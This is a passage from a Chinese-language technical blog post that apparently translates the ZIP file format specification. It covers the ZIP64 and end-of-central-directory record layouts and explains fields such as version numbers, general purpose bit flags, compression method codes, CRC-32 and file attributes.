style="text-align:center">2</td><td style="text-align:left">压缩所用的ZIP版本</td></tr><tr><td style="text-align:left">Version needed to extract</td><td style="text-align:center">2</td><td style="text-align:left">解压文件所需的ZIP最低版本</td></tr><tr><td style="text-align:left">Number of this disk</td><td style="text-align:center">4</td><td style="text-align:left">当前磁盘编号</td></tr><tr><td style="text-align:left">Number of the disk with the start of the central directory</td><td style="text-align:center">4</td><td style="text-align:left">中心目录开头所在的磁盘号</td></tr><tr><td style="text-align:left">Total number of entries in the central directory on this disk</td><td style="text-align:center">8</td><td style="text-align:left">该磁盘上中心目录的条目总数</td></tr><tr><td style="text-align:left">Total number of entries in the central directory</td><td style="text-align:center">8</td><td style="text-align:left">中心目录中的条目总数</td></tr><tr><td style="text-align:left">Size of the central directory</td><td style="text-align:center">8</td><td style="text-align:left">中心目录的大小</td></tr><tr><td style="text-align:left">Offset of start of central directory with respect to the starting disk number</td><td style="text-align:center">8</td><td style="text-align:left">中心目录开始位置相对于压缩文档开始位置的偏移</td></tr><tr><td style="text-align:left">ZIP64 extensible data sector</td><td style="text-align:center">N</td><td style="text-align:left">ZIP64扩展数据段</td></tr></tbody></table><p>&emsp;&emsp;存储在“<code>ZIP64中心目录结束记录的大小</code>(Size of ZIP64 end of central directory record)”中的值应为<code>剩余记录</code>的大小，并且不应包含<code>前导的12个字节</code>。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Size = SizeOfFixedFields(固定字段) + SizeOfVariableData(可变数据)- 12</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上面的记录结构定义了<code>ZIP64中心目录结束记录</code>的<code>版本1</code>。 为了支持<code>ZIP64大文件功能</code>，在<code>6.2之前</code>的版本中实现了<code>版本1</code>。 作为<code>强加密规范</code>的一部分，在<code>版本6.2</code>中实现的<code>中心目录加密功能</code>的引入定义了此记录结构的<code>版本2</code>。 有关此记录的版本2格式的详细信息，请参阅描述“强加密规范”的部分。<br>&emsp;&emsp;<code>特殊用途的数据</code>可以位于该记录的V1或V2版本后面的<code>ZIP64扩展数据段</code>中。为了确保<code>识别</code>此特殊用途的数据，它必须包括一个由以下内容组成的<code>识别头块</code>：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header ID</td><td style="text-align:center">2</td><td style="text-align:left">头ID字段指示随后的数据块中数据的数据类型。</td></tr><tr><td style="text-align:left">Data Size</td><td style="text-align:center">4</td><td style="text-align:left">数据大小标识此数据块类型后面的数据的字节数。</td></tr></tbody></table><p>&emsp;&emsp;可能存在<code>多个</code>特殊用途的数据块。 每一个必须以<code>Header ID</code>和<code>Data Size</code>字段为<code>先导字段</code>。 当前该字段中支持的<code>Header ID值的映射</code>如<code>附录C</code>中所定义。</p><h4 id="2-3-9、ZIP64中心目录结束定位器-ZIP64-end-of-central-directory-locator"><a href="#2-3-9、ZIP64中心目录结束定位器-ZIP64-end-of-central-directory-locator" class="headerlink" title="2.3.9、ZIP64中心目录结束定位器(ZIP64 end of central directory locator)"></a>2.3.9、ZIP64中心目录结束定位器(ZIP64 end of central directory locator)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">ZIP64 end of central directory locator signature</td><td style="text-align:center">4</td><td style="text-align:left">ZIP64中心目录结束定位器标识，固定值(50 4B 06 07)</td></tr><tr><td style="text-align:left">Number of the disk with the start of the zip64 end of central directory</td><td style="text-align:center">4</td><td style="text-align:left">ZIP64中心目录开头所在的磁盘号</td></tr><tr><td style="text-align:left">Relative offset of the zip64 end of central directory record</td><td style="text-align:center">8</td><td style="text-align:left">ZIP64中心目录结束记录相对偏移</td></tr><tr><td style="text-align:left">Total number of disks</td><td style="text-align:center">4</td><td style="text-align:left">磁盘总数</td></tr></tbody></table><h4 id="2-3-10、中心目录结束记录-End-of-central-directory-record"><a href="#2-3-10、中心目录结束记录-End-of-central-directory-record" class="headerlink" title="2.3.10、中心目录结束记录(End of central directory record)"></a>2.3.10、中心目录结束记录(End of central directory record)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">End of central directory signature</td><td style="text-align:center">4</td><td style="text-align:left">中心目录结束标识，固定值(50 4B 05 06)</td></tr><tr><td style="text-align:left">Number of this disk</td><td style="text-align:center">2</td><td style="text-align:left">当前磁盘编号</td></tr><tr><td style="text-align:left">Number of the disk with the start of the central directory</td><td style="text-align:center">2</td><td style="text-align:left">中心目录开头所在的磁盘号</td></tr><tr><td style="text-align:left">Total number of entries in the central directory on this disk</td><td style="text-align:center">2</td><td style="text-align:left">该磁盘上中心目录的条目总数</td></tr><tr><td style="text-align:left">Total number of entries in the central directory</td><td style="text-align:center">2</td><td style="text-align:left">中心目录的条目总数</td></tr><tr><td style="text-align:left">Size of the central directory</td><td style="text-align:center">4</td><td style="text-align:left">中心目录的大小</td></tr><tr><td style="text-align:left">Offset of start of central directory with respect to the starting disk number</td><td style="text-align:center">4</td><td style="text-align:left">中心目录开始位置相对于压缩文档开始位置的偏移</td></tr><tr><td style="text-align:left">.ZIP file comment length</td><td style="text-align:center">2</td><td style="text-align:left">.ZIP文件注释长度</td></tr><tr><td style="text-align:left">.ZIP file comment</td><td style="text-align:center">N</td><td style="text-align:left">.ZIP文件注释</td></tr></tbody></table><h3 id="2-4、字段解释"><a href="#2-4、字段解释" class="headerlink" title="2.4、字段解释"></a>2.4、字段解释</h3><h4 id="2-4-1、字段的一般说明"><a href="#2-4-1、字段的一般说明" class="headerlink" title="2.4.1、字段的一般说明"></a>2.4.1、字段的一般说明</h4><p>&emsp;&emsp;除非另有说明，否则所有字段均为<code>无符号数据类型</code>，并以Intel<code>低字节:高字节</code>，<code>低字节:高字节</code>顺序存储(<code>小端模式</code>)。<br>&emsp;&emsp;<code>字符串字段</code>不是以<code>null</code>结尾的，因为长度是<code>明确指定</code>的。<br>&emsp;&emsp;中心目录中的<code>条目的顺序</code>可能不一定与文件在<code>.ZIP文件</code>中<code>出现的顺序</code>相同。<br>&emsp;&emsp;如果<code>中心目录结束记录</code>的字段之一<code>太小</code>而无法容纳所需的数据，则应将字段设置为<code>-1(0xFFFF或0xFFFFFFFF)</code>，并应创建<code>ZIP64格式的记录</code>。<br>&emsp;&emsp;<code>拆分</code>或<code>扩展</code>压缩文件时，<code>中心目录结束记录</code>和<code>ZIP64中心目录结束定位器记录</code>的务必驻留在<code>同一磁盘</code>上。</p><h4 id="2-4-2、压缩所用的ZIP版本-Version-made-by-2-bytes"><a href="#2-4-2、压缩所用的ZIP版本-Version-made-by-2-bytes" class="headerlink" title="2.4.2、压缩所用的ZIP版本(Version made by) (2 bytes)"></a>2.4.2、压缩所用的ZIP版本(Version made by) (2 bytes)</h4><p>&emsp;&emsp;<code>高位字节</code>指示文件属性信息的兼容性。 如果<code>外部文件属性</code>与MS-DOS兼容并且可以由<code>DOS版本2.04g的PKZIP</code>读取，则该值将为<code>零</code>。 如果<code>这些属性不兼容</code>，则此值将标识<code>属性兼容的主机系统</code>。 软件可以使用此信息来确定文本文件等的<code>行记录格式</code>。</p><p>当前的映射为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0 - MS-DOS and OS/2(FAT/VFAT/FAT32 file systems)</span><br><span class="line">1 - Amiga                     2 - OpenVMS</span><br><span class="line">3 - UNIX                      4 - VM/CMS</span><br><span class="line">5 - Atari ST                  6 - OS/2 H.P.F.S.</span><br><span class="line">7 - Macintosh                 8 - Z-System</span><br><span class="line">9 - CP/M                      10 - Windows NTFS</span><br><span class="line">11 - MVS (OS/390 - Z/OS)      12 - VSE</span><br><span class="line">13 - Acorn Risc               14 - VFAT</span><br><span class="line">15 - alternate MVS            16 - BeOS</span><br><span class="line">17 - Tandem                   18 - OS/400</span><br><span class="line">19 - OS X (Darwin)            20 thru 255 - unused</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>低位字节</code>指示用于编码文件的软件支持的<code>ZIP规范版本</code>(本文档的版本)。 <code>value/10</code>表示<code>主要版本号</code>，<code>value mod 10</code>是<code>次要版本号</code>。</p><h4 id="2-4-3、解压文件所需的ZIP最低版本-Version-needed-to-extract-2-bytes"><a href="#2-4-3、解压文件所需的ZIP最低版本-Version-needed-to-extract-2-bytes" class="headerlink" title="2.4.3、解压文件所需的ZIP最低版本(Version needed to extract) (2 bytes)"></a>2.4.3、解压文件所需的ZIP最低版本(Version needed to extract) (2 bytes)</h4><p>&emsp;&emsp;解压文件所需的<code>最低受支持ZIP规范版本</code>，如上映射。该值基于<code>ZIP程序必须支持的特定格式功能</code>才能解压文件。如果将<code>多个功能</code>应用于文件，则必须将最低版本设置为<code>具有最高值的功能的版本值</code>。为了避免冲突，<code>新功能</code>或<code>功能更改</code>将使用比上次发布的值更高的版本号实现影响已发布的格式规范。</p><p>当前的<strong><code>最低功能版本</code></strong>如下所示：</p><ul><li><code>1.0</code> - Default value：默认值。</li><li><code>1.1</code> - File is a volume label：文件是一个卷标。</li><li><code>2.0</code> - File is a folder (directory)：文件是一个文件夹(目录)。</li><li><code>2.0</code> - File is compressed using Deflate compression：使用<code>Deflate压缩方法</code>对文件进行压缩。</li><li><code>2.0</code> - File is encrypted using traditional PKWARE encryption：使用<code>传统的PKWARE加密</code>对文件进行加密。</li><li><code>2.1</code> - File is compressed using Deflate64(tm)：使用<code>Deflate64(tm)压缩方法</code>对文件进行压缩。</li><li><code>2.5</code> - File is compressed using PKWARE DCL Implode：使用<code>PKWARE DCL Implode压缩</code>方法对文件进行压缩。</li><li><code>2.7</code> - File is a patch data set：文件是补丁数据集。</li><li><code>4.5</code> - File uses ZIP64 format extensions：文件使用<code>ZIP64格式扩展</code>。</li><li><code>4.6</code> - File is compressed using BZIP2 compression*：使用<code>BZIP2压缩方法</code>对文件进行压缩。</li><li><code>5.0</code> - File is encrypted using DES：使用<code>DES</code>对文件进行加密。</li><li><code>5.0</code> - File is encrypted using 3DES：使用<code>3DES</code>对文件进行加密。</li><li><code>5.0</code> - File is encrypted using original RC2 encryption：使用<code>原始RC2加密</code>对文件进行加密。</li><li><code>5.0</code> - File is encrypted using RC4 encryption：使用<code>RC4加密</code>对文件进行加密。</li><li><code>5.1</code> - File is encrypted using AES encryption：使用<code>AES加密</code>对文件进行加密。</li><li><code>5.1</code> - File is encrypted using corrected RC2 encryption**：使用<code>更正的RC2加密</code>对文件进行加密。</li><li><code>5.2</code> - File is encrypted using corrected RC2-64 encryption**：使用<code>更正的RC2-64加密</code>对文件进行加密</li><li><code>6.1</code> - File is encrypted using non-OAEP key wrapping<em>*</em>：使用<code>non-OAEP密钥包装</code>对文件进行加密。</li><li><code>6.2</code> - Central directory encryption：中心目录加密。</li><li><code>6.3</code> - File is compressed using LZMA：使用<code>LZMA压缩方法</code>对文件进行压缩。</li><li><code>6.3</code> - File is compressed using PPMd+：使用<code>PPMd+压缩方法</code>对文件进行压缩。</li><li><code>6.3</code> - File is encrypted using Blowfish：使用<code>Blowfish</code>对文件进行加密。</li><li><code>6.3</code> - File is encrypted using Twofish：使用<code>Twofish</code>对文件进行加密。</li></ul><p><strong><code>需要解压的版本注释：</code></strong><br>&emsp;&emsp;PKZIP的7.x(7.2之前)的<code>早期版本</code>错误地将<code>BZIP2压缩</code>所需的提取版本设置为<code>50</code>，但应将其设置为<code>46</code>。<br>&emsp;&emsp;有关<code>RC2校正</code>的更多信息，请参阅“<code>强加密规范</code>”部分。<br>&emsp;&emsp;使用<code>non-OAEP密钥包装</code>的证书加密是从<code>6.1</code>开始的所有版本的<code>预期操作模式</code>。当发送要由<code>低于6.1(5.0或6.0)</code>的PKZIP版本打开的ZIP文件时，对OAEP密钥包装的支持只能用于<code>向后兼容</code>。<br>&emsp;&emsp;使用<code>PPMd+压缩</code>的文件必须将<code>解压文件所需的版本</code>字段设置为<code>6.3</code>，但是，并非所有ZIP程序都强制执行此操作，并且如果设置了该值，则可能<code>无法解压缩</code>使用<code>PPMd+压缩</code>的数据文件。<br>&emsp;&emsp;使用<code>ZIP64扩展</code>时，还必须在<code>ZIP64中心目录结束记录</code>中设置相应的值。 应该适当地设置该字段以指示使用的是<code>版本1</code>还是<code>版本2</code>格式。</p><h4 id="2-4-4、通用位标志-General-purpose-bit-flag-2-bytes"><a href="#2-4-4、通用位标志-General-purpose-bit-flag-2-bytes" class="headerlink" title="2.4.4、通用位标志(General purpose bit flag) (2 bytes)"></a>2.4.4、通用位标志(General purpose bit flag) (2 bytes)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Bit 0: 如果设置，表示文件已加密。</span><br><span class="line"></span><br><span class="line">(压缩方法6 - Imploding)</span><br><span class="line">Bit 1: 如果使用的压缩方法是类型6，Imploding。如果设置了此位，表明</span><br><span class="line">       使用了8K滑动词典。如果清除了此位，表明使用了4K滑动词典。</span><br><span class="line">Bit 2: 如果使用的压缩方法是类型6，Imploding。如果设置了此位，表明</span><br><span class="line">       使用了3个Shannon-Fano树来编码滑动字典输出。如果清除了此位，</span><br><span class="line">       则使用了2个Shannon-Fano树。</span><br><span class="line"></span><br><span class="line">(压缩方法8和9 - Deflating)</span><br><span class="line">Bit 2  Bit 1</span><br><span class="line">  0      0    使用了正常（-en）压缩选项。</span><br><span class="line">  0      1    使用了最大（-exx/-ex）压缩选项。</span><br><span class="line">  1      0    使用了快速（-ef）压缩选项。</span><br><span class="line">  1      1    使用了超快速（-es）压缩选项。</span><br><span class="line"></span><br><span class="line">(压缩方法14 - LZMA)</span><br><span class="line">Bit 1: 如果使用的压缩方法是类型14，LZMA。如果设置了此位，表明使用</span><br><span class="line">       end-of-stream(EOS)标记来标记压缩数据流的结束。如果清除了</span><br><span class="line">       此位，则不使用EOS标记，并且必须知道提取的压缩数据大小。</span><br><span class="line">注意: 如果压缩方法是任何其他方式，则位1和2是不确定的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Bit 3: 如果设置了此位，则本地头中的字段CRC-32，压缩大小和未压缩大小</span><br><span class="line">       设置为零。正确的值将紧随压缩数据之后放入数据描述符中。</span><br><span class="line">注意：用于DOS的PKZIP版本2.04g仅在压缩方法8中识别此位，对于任何压缩方法，较新版本的PKZIP均识别该位。</span><br><span class="line">Bit 4: 保留用于压缩方法8，以增强deflating。</span><br><span class="line">Bit 5: 如果设置此位，则表明文件是压缩的补丁数据。</span><br><span class="line">注意：需要PKZIP版本2.70或更高版本。</span><br><span class="line">Bit 6: 强加密功能。如果设置了此位，则必须将提取文件所需的版本设置为</span><br><span class="line">       至少50，并且还必须设置位0。如果使用AES加密，则提取文件所需</span><br><span class="line">       的版本必须至少为51。有关详细信息，请参见强加密规范。 </span><br><span class="line">Bit 7: 目前未使用。</span><br><span class="line">Bit 8: 目前未使用。</span><br><span class="line">Bit 9: 目前未使用。</span><br><span class="line">Bit 10: 目前未使用。</span><br><span class="line">Bit 11: 语言编码标志(EFS)。 如果该位置1，则该文件的文件名和注释字</span><br><span class="line">        段必须使用UTF-8编码。(请参阅附录D)</span><br><span class="line">Bit 12: 由PKWARE保留，用于增强压缩。</span><br><span class="line">Bit 13: 在加密中心目录时设置，以指示本地头中的选定数据值被屏蔽以隐藏</span><br><span class="line">        其实际值。有关详细信息，请参见描述强加密规范的部分。 </span><br><span class="line">Bit 14: 由PKWARE保留。</span><br><span class="line">Bit 15: 由PKWARE保留。</span><br></pre></td></tr></table></figure><h4 id="2-4-5、压缩方法-Compression-method-2-bytes"><a href="#2-4-5、压缩方法-Compression-method-2-bytes" class="headerlink" title="2.4.5、压缩方法(Compression method) (2 bytes)"></a>2.4.5、压缩方法(Compression method) (2 bytes)</h4><ul><li><code>0</code> - The file is stored (no compression)：存储(无压缩)。</li><li><code>1</code> - The file is Shrunk：文件缩小。</li><li><code>2</code> - The file is Reduced with compression factor 1：待补充。</li><li><code>3</code> - The file is Reduced with compression factor 2：待补充。</li><li><code>4</code> - The file is Reduced with compression factor 3：待补充。</li><li><code>5</code> - The file is Reduced with compression factor 4：待补充。</li><li><code>6</code> - The file is Imploded：Imploding压缩算法。</li><li><code>7</code> - Reserved for Tokenizing compression algorithm：为Tokenizing压缩算法保留。</li><li><code>8</code> - The file is Deflated：Deflated压缩算法。</li><li><code>9</code> - Enhanced Deflating using Deflate64(tm)：加强的压缩算法Deflate64(tm)。</li><li><code>10</code> - PKWARE Data Compression Library Imploding (old IBM TERSE)：PKWARE DCL Implode压缩算法(旧的IBM TERSE压缩算法)。</li><li><code>11</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>12</code> - File is compressed using BZIP2 algorithm：BZIP2压缩算法。</li><li><code>13</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>14</code> - LZMA：LZMA压缩算法。</li><li><code>15</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>16</code> - IBM z/OS CMPSC Compression：IBM z/OS CMPSC压缩算法。</li><li><code>17</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>18</code> - File is compressed using IBM TERSE (new)：IBM TERSE压缩算法(新的)。</li><li><code>19</code> - IBM LZ77 z Architecture (PFS)：IBM LZ77 z Architecture压缩算法。</li><li><code>96</code> - JPEG variant：JPEG变种压缩算法。</li><li><code>97</code> - WavPack compressed data：WavPack压缩算法。</li><li><code>98</code> - PPMd version I, Rev 1：PPMd压缩算法版本1。</li><li><code>99</code> - AE-x encryption marker (see APPENDIX E)：AE-x加密标记(请参阅附录E)。</li></ul><h4 id="2-4-6、日期和时间字段-Date-and-Time-fields-2-bytes"><a href="#2-4-6、日期和时间字段-Date-and-Time-fields-2-bytes" class="headerlink" title="2.4.6、日期和时间字段(Date and Time fields) (2 bytes)"></a>2.4.6、日期和时间字段(Date and Time fields) (2 bytes)</h4><p>&emsp;&emsp;日期和时间以<code>标准MS-DOS格式</code>编码。如果输入来自<code>标准输入</code>，则日期和时间是<code>开始对此数据进行压缩</code>的日期和时间。 如果<code>加密了中心目录</code>并且设置了<code>通用位标志13</code>以表示屏蔽，则存储在本地头中的值将为零。 <code>MS-DOS时间格式</code>不同于计算机常用的时间格式，例如<code>UTC</code>。 例如，MS-DOS使用相对于1980年和2秒精度的<code>年份值</code>。</p><h4 id="2-4-7、CRC-32-4-bytes"><a href="#2-4-7、CRC-32-4-bytes" class="headerlink" title="2.4.7、CRC-32 (4 bytes)"></a>2.4.7、CRC-32 (4 bytes)</h4><p>&emsp;&emsp;<code>CRC-32</code>算法由<code>David Schwaderer</code>慷慨贡献，可以在他的出色著作《 NetBIOS C程序员指南》中找到，该书由Howard W. Sams＆Co. Inc.发行。CRC的“<code>Magic Number</code>”为<code>0xDEBB20E3</code>。使用了适当的CRC<code>预处理</code>和<code>后处理</code>，这意味着所有CRC寄存器被预处理了(起始值为<code>0xFFFFFFFF</code>)，并且该值通过<code>对CRC残差进行补码</code>来进行后处理。如果设置了<code>通用位标志的第3位</code>，则该字段在本地头中设置为零，并将<code>正确的值</code>放在<code>数据描述符</code>和<code>中心目录</code>中。<code>加密中心目录</code>时，如果本地头不是<code>ZIP64格式</code>，并且设置了<code>通用位标志13</code>以表示屏蔽，则本地头中存储的值将为零。</p><h4 id="2-4-8、压缩文件的大小-Compressed-size-4-bytes"><a href="#2-4-8、压缩文件的大小-Compressed-size-4-bytes" class="headerlink" title="2.4.8、压缩文件的大小(Compressed size) (4 bytes)"></a>2.4.8、压缩文件的大小(Compressed size) (4 bytes)</h4><h4 id="2-4-9、未压缩文件的大小-Uncompressed-size-4-bytes"><a href="#2-4-9、未压缩文件的大小-Uncompressed-size-4-bytes" class="headerlink" title="2.4.9、未压缩文件的大小(Uncompressed size) (4 bytes)"></a>2.4.9、未压缩文件的大小(Uncompressed size) (4 bytes)</h4><p>&emsp;&emsp;<code>压缩文件的大小</code>(2.4.8)和<code>未压缩文件的大小</code>(2.4.9)。存在<code>解密头</code>时，它将被放置在<code>文件数据</code>的前面，并且<code>压缩文件大小的值</code>将包括<code>解密头的字节</code>。如果设置了<code>通用位标志的位3</code>，则这些字段在<code>本地头</code>中设置为<code>零</code>，并且<code>正确的值</code>放在<code>数据描述符</code>和<code>中心目录</code>中。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则大小将在相应的8字节<code>ZIP64扩展信息扩展字段</code>中。当<code>加密中心目录</code>时，如果<code>本地头</code>不是ZIP64格式，并且设置了<code>通用位标志的位13</code>以表示屏蔽，则在<code>本地头</code>中为<code>未压缩文件大小</code>存储的值将为<code>零</code>。</p><h4 id="2-4-10、文件名长度-File-name-length-2-bytes"><a href="#2-4-10、文件名长度-File-name-length-2-bytes" class="headerlink" title="2.4.10、文件名长度(File name length) (2 bytes)"></a>2.4.10、文件名长度(File name length) (2 bytes)</h4><h4 id="2-4-11、扩展区域长度-Extra-field-length-2-bytes"><a href="#2-4-11、扩展区域长度-Extra-field-length-2-bytes" class="headerlink" title="2.4.11、扩展区域长度(Extra field length) (2 bytes)"></a>2.4.11、扩展区域长度(Extra field length) (2 bytes)</h4><h4 id="2-4-12、文件注释长度-File-comment-length-2-bytes"><a href="#2-4-12、文件注释长度-File-comment-length-2-bytes" class="headerlink" title="2.4.12、文件注释长度(File comment length) (2 bytes)"></a>2.4.12、文件注释长度(File comment length) (2 bytes)</h4><p>&emsp;&emsp;<code>文件名</code>，<code>扩展区域字段</code>和<code>文件注释字段</code>的长度。<code>任何目录记录</code>和<code>这三个字段</code>的<code>合计长度</code>通常不应超过<code>65535</code>个字节。如果输入来自<code>标准输入</code>，则<code>文件名长度</code>设置为零。</p><h4 id="2-4-13、文件开始位置所在的磁盘编号-Disk-number-start-2-bytes"><a href="#2-4-13、文件开始位置所在的磁盘编号-Disk-number-start-2-bytes" class="headerlink" title="2.4.13、文件开始位置所在的磁盘编号(Disk number start) (2 bytes)"></a>2.4.13、文件开始位置所在的磁盘编号(Disk number start) (2 bytes)</h4><p>&emsp;&emsp;该文件开始所在的磁盘编号。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的4字节<code>ZIP64扩展信息扩展字段</code>中。</p><h4 id="2-4-14、内部文件属性-Internal-file-attributes-2-bytes"><a href="#2-4-14、内部文件属性-Internal-file-attributes-2-bytes" class="headerlink" title="2.4.14、内部文件属性(Internal file attributes) (2 bytes)"></a>2.4.14、内部文件属性(Internal file attributes) (2 bytes)</h4><p>&emsp;&emsp;<code>位1</code>和<code>位2</code>保留供PKWARE使用。<br>&emsp;&emsp;如果<code>设置</code>该字段的<code>最低位</code>，则表明该文件显然是<code>ASCII</code>或<code>文本</code>文件。 如果<code>未设置</code>，则该文件显然包含<code>二进制数据</code>。其余位在<code>1.0版</code>中未使用。<br>&emsp;&emsp;如果设置了此字段的<code>0x0002位</code>，则表示每个<code>逻辑记录</code>之前都有4字节可变<code>记录长度控制字段</code>，指示<code>记录的长度</code>。 记录长度控制字段以<code>小端字节序</code>存储。 该标志独立于<code>文本控制字符</code>，并且如果与<code>文本数据</code>一起使用，则在<code>记录的总长度</code>中包括<code>所有控制字符</code>。 提供此值是为了支持<code>大型数据传输</code>。</p><h4 id="2-4-15、外部文件属性-External-file-attributes-4-bytes"><a href="#2-4-15、外部文件属性-External-file-attributes-4-bytes" class="headerlink" title="2.4.15、外部文件属性(External file attributes) (4 bytes)"></a>2.4.15、外部文件属性(External file attributes) (4 bytes)</h4><p>&emsp;&emsp;<code>外部属性的映射</code>取决于<code>主机系统</code>(请参阅“Version made by”)。对于<code>MS-DOS</code>，<code>低位字节</code>是MS-DOS<code>目录属性字节</code>。如果输入来自<code>标准输入</code>，则此字段设置为<code>0</code>。</p><h4 id="2-4-16、本地文件头的相对偏移-Relative-offset-of-local-header-4-bytes"><a href="#2-4-16、本地文件头的相对偏移-Relative-offset-of-local-header-4-bytes" class="headerlink" title="2.4.16、本地文件头的相对偏移(Relative offset of local header) (4 bytes)"></a>2.4.16、本地文件头的相对偏移(Relative offset of local header) (4 bytes)</h4><p>&emsp;&emsp;这是从<code>此文件出现的第一个磁盘的开始</code>到<code>本地头</code>的偏移量。 如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则此字段将在相应的8字节<code>ZIP64扩展信息扩展字段</code>中。</p><h4 id="2-4-17、文件名-File-name-N-bytes"><a href="#2-4-17、文件名-File-name-N-bytes" class="headerlink" title="2.4.17、文件名(File name) (N bytes)"></a>2.4.17、文件名(File name) (N bytes)</h4><p>&emsp;&emsp;文件名，带有可选的<code>相对路径</code>。存储的路径不得包含<code>驱动器</code>或<code>设备字母</code>或<code>前导斜杠</code>。为了与<code>Amiga</code>和<code>UNIX</code>文件系统兼容，所有斜杠必须为<code>正斜杠“/”</code>，而不是<code>反斜杠“\”</code>。如果输入来自<code>标准输入</code>，则<code>没有</code>文件名字段。<br>&emsp;&emsp;如果使用<code>中心目录加密功能</code>，并且设置了<code>通用位标志的位13</code>以表示屏蔽，则存储在<code>本地头</code>中的文件名将<code>不是实际的文件名</code>。将存储由唯一的十六进制值组成的<code>掩码值</code>。对于压缩文件中的每个文件，此值将<code>按顺序递增</code>。有关检索加密文件名的详细信息，请参见“强加密规范”部分。 </p><h4 id="2-4-18、文件注释-File-comment-N-bytes"><a href="#2-4-18、文件注释-File-comment-N-bytes" class="headerlink" title="2.4.18、文件注释(File comment) (N bytes)"></a>2.4.18、文件注释(File comment) (N bytes)</h4><p>&emsp;&emsp;此压缩文件的<code>注释</code>。</p><h4 id="2-4-19、当前磁盘号-Number-of-this-disk-2-bytes"><a href="#2-4-19、当前磁盘号-Number-of-this-disk-2-bytes" class="headerlink" title="2.4.19、当前磁盘号(Number of this disk) (2 bytes)"></a>2.4.19、当前磁盘号(Number of this disk) (2 bytes)</h4><p>&emsp;&emsp;当前磁盘的编号，其中包含<code>中心目录结束记录</code>。 如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>4字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-20、中心目录开头所在的磁盘号-Number-of-the-disk-with-the-start-of-the-central-directory-2-bytes"><a href="#2-4-20、中心目录开头所在的磁盘号-Number-of-the-disk-with-the-start-of-the-central-directory-2-bytes" class="headerlink" title="2.4.20、中心目录开头所在的磁盘号(Number of the disk with the start of the central directory) (2 bytes)"></a>2.4.20、中心目录开头所在的磁盘号(Number of the disk with the start of the central directory) (2 bytes)</h4><p>&emsp;&emsp;中心目录开头所在的磁盘号。 如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>4字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-21、该磁盘上中心目录的条目总数-Total-number-of-entries-in-the-central-directory-on-this-disk-2-bytes"><a href="#2-4-21、该磁盘上中心目录的条目总数-Total-number-of-entries-in-the-central-directory-on-this-disk-2-bytes" class="headerlink" title="2.4.21、该磁盘上中心目录的条目总数(Total number of entries in the central directory on this disk) (2 bytes)"></a>2.4.21、该磁盘上中心目录的条目总数(Total number of entries in the central directory on this disk) (2 bytes)</h4><p>&emsp;&emsp;该磁盘上中心目录的条目总数。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-22、中心目录的条目总数-Total-number-of-entries-in-the-central-directory-2-bytes"><a href="#2-4-22、中心目录的条目总数-Total-number-of-entries-in-the-central-directory-2-bytes" class="headerlink" title="2.4.22、中心目录的条目总数(Total number of entries in the central directory) (2 bytes)"></a>2.4.22、中心目录的条目总数(Total number of entries in the central directory) (2 bytes)</h4><p>&emsp;&emsp;ZIP文件中的文件总数。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-23、中心目录的大小-Size-of-the-central-directory-4-bytes"><a href="#2-4-23、中心目录的大小-Size-of-the-central-directory-4-bytes" class="headerlink" title="2.4.23、中心目录的大小(Size of the central directory) (4 bytes)"></a>2.4.23、中心目录的大小(Size of the central directory) (4 bytes)</h4><p>&emsp;&emsp;整个中央目录的大小(以<code>字节</code>为单位)。 